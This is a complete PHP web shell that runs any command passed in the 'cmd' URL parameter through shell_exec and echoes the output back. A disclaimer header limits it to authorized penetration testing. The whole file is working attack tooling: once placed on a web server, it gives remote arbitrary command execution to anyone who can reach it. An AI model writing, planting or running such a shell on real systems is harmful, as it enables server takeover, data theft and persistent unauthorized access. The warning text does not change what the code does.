<?php
/*
* BASIC PHP WEB SHELL
* 
* ⚠️  SECURITY WARNING ⚠️
* This tool is for AUTHORIZED PENETRATION TESTING ONLY
* - Only use on systems you own or have explicit permission to test
* - Unauthorized access is illegal and punishable by law
* - Remove immediately after testing
* 
* Usage: shell.php?cmd=whoami
*/

// Basic input validation (still vulnerable by design for testing)
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    
    // Log the command for testing purposes
    error_log("Shell command executed: " . $cmd);
    
    // Execute command (intentionally vulnerable for penetration testing)
    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
} else {
    echo "Usage: ?cmd=command_here";
}
?>
